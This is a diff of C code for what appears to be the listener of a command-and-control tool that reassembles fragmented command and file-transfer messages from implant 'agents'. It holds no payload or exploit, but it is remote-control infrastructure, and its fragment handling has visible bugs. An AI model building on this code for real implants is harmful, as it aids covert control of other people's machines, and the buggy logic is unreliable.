@@ -21,7 +21,7 @@ This file is responsible for the following:
 #include "queue.h"
 #include "implant.h"
 #include "base.h"
-#include "message_handler.h"
+#include "listener_handler.h"
 
 #define FDSIZE			10
 
@@ -55,6 +55,7 @@ void *handle_message(void*){
 		}
 		else if (ntohl(fragment->type) == TYPE_COMMAND || ntohl(fragment->type) == TYPE_PUT_FILE || ntohl(fragment->type) == TYPE_GET_FILE){
 			if (agents[message->id]->last_fragment_index == -1 && ntohl(fragment->index == 0)){
+				debug_print("Got first command or file fragment: %d\n", ntohl(fragment->first_payload.total_size));
 				// get payload size
 				agents[message->id]->total_message_size = ntohl(fragment->first_payload.total_size);
 				
@@ -65,17 +66,18 @@ void *handle_message(void*){
 				agents[message->id]->message = malloc(agents[message->id]->total_message_size);
 				memset(agents[message->id]->message, 0, agents[message->id]->total_message_size);
 				
-				int this_payload_size = message->fragment_size - sizeof(fragment->type) - sizeof(fragment->index) - sizeof(fragment->first_payload.total_size);
+				int this_payload_size = message->size - sizeof(fragment->type) - sizeof(fragment->index) - sizeof(fragment->first_payload.total_size);
 				
 				// copy payload (not including total message size) to message buffer
 				memcpy(agents[message->id]->message, fragment->first_payload.actual_payload, this_payload_size);
 				
 				// record current size of message
 				agents[message->id]->current_message_size = this_payload_size;
+				debug_print("agents[message->id]->current_message_size: %d\n", agents[message->id]->current_message_size);
 				
 			}
 			else if (ntohl(fragment->index) == agents[message->id]->last_fragment_index++){
-				int this_payload_size = message->fragment_size - sizeof(fragment->type) - sizeof(fragment->index);
+				int this_payload_size = message->size - sizeof(fragment->type) - sizeof(fragment->index);
 				
 				// copy payload to end of message buffer
 				memcpy(agents[message->id]->message, fragment->next_payload, this_payload_size);
@@ -90,7 +92,7 @@ void *handle_message(void*){
 			
 			// check if we received all fragments
 			if (agents[message->id]->total_message_size == agents[message->id]->current_message_size){
-				printf("Do something with completed message %s\n", agents[message->id]->message);
+				printf("Do something with completed message:\n%s\n", agents[message->id]->message);
 				agents[message->id]->last_fragment_index = -1;
 			}
 		}
@@ -100,8 +102,8 @@ void *handle_message(void*){
 	return 0;
 }
 
-int prepare_message(int sockfd, int type, char* message, int message_size){
-	Queue_Message* queue_message;
+int listener_prepare_message(int sockfd, int type, char* message, int message_size){
+	Queue_Message* q_message;
 	Fragment* fragment;
 	int bytes_sent = 0;
 	char* buf;
@@ -109,6 +111,7 @@ int prepare_message(int sockfd, int type, char* message, int message_size){
 	
 	// prepare first fragment with size in first 4 bytes
 	fragment = malloc(sizeof(Fragment));
+	memset(fragment, 0, sizeof(Fragment));
 	fragment->type = htonl(type);
 	fragment->index = htonl(index++);
 	fragment->first_payload.total_size = htonl(message_size);
@@ -116,32 +119,34 @@ int prepare_message(int sockfd, int type, char* message, int message_size){
 	bytes_sent = message_size < (BUFFERSIZE - 4) ? message_size : BUFFERSIZE - 4;
 	memcpy(fragment->first_payload.actual_payload, message, bytes_sent);
 	
-	queue_message = malloc(sizeof(Queue_Message));
-	queue_message->id = sockfd;
-	queue_message->fragment_size = bytes_sent;
-	queue_message->fragment = fragment;
+	q_message = malloc(sizeof(Queue_Message));
+	memset(q_message, 0, sizeof(Queue_Message));
+	q_message->id = sockfd;
+	q_message->size = sizeof(fragment->type) + sizeof(fragment->index) + sizeof(fragment->first_payload.total_size) + bytes_sent;
+	q_message->fragment = fragment;
 
-	enqueue(listener_send_queue, &listener_send_queue_lock, queue_message);
+	enqueue(listener_send_queue, &listener_send_queue_lock, q_message);
 	
 	while (bytes_sent < message_size){
 		fragment = malloc(sizeof(Fragment));
+		memset(fragment, 0, sizeof(Fragment));
 		fragment->type = htonl(type);
 		fragment->index = htonl(index++);
 		
 		int num_fragment_bytes = (message_size - bytes_sent) < BUFFERSIZE ? (message_size - bytes_sent) : BUFFERSIZE;
 		memcpy(fragment->next_payload, message + bytes_sent, num_fragment_bytes);
 		
-		queue_message = malloc(sizeof(Queue_Message));
-		queue_message->id = sockfd;
-		queue_message->fragment_size = num_fragment_bytes;
+		q_message = malloc(sizeof(Queue_Message));
+		memset(q_message, 0, sizeof(Queue_Message));
+		q_message->id = sockfd;
+		q_message->size = sizeof(fragment->type) + sizeof(fragment->index) + num_fragment_bytes;
 
-		enqueue(listener_send_queue, &listener_send_queue_lock, queue_message);
+		enqueue(listener_send_queue, &listener_send_queue_lock, q_message);
 		
 		bytes_sent += num_fragment_bytes;
 	}
 	
 	free(message);
-	
 	return 0;
 }
 
